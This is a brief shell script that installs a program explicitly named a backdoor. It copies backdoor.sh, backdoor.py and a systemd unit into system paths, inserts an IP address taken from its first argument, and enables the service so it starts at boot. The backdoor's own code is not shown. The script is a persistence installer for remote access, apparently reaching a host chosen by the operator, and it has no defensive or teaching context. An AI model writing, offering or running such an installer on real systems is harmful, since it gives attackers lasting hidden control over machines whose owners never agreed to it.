#!/bin/sh

sudo cp backdoor.sh /usr/local/bin/backdoor.sh
sudo chmod ugo+x /usr/local/bin/backdoor.sh

sudo cp backdoor.py /usr/local/bin/backdoor.py
sudo chmod ugo+x /usr/local/bin/backdoor.py

sudo cp backdoor.service /etc/systemd/system/backdoor.service
sudo sed -i s/CHANGE_IP/$1/g /etc/systemd/system/backdoor.service
sudo systemctl daemon-reload
sudo systemctl enable backdoor
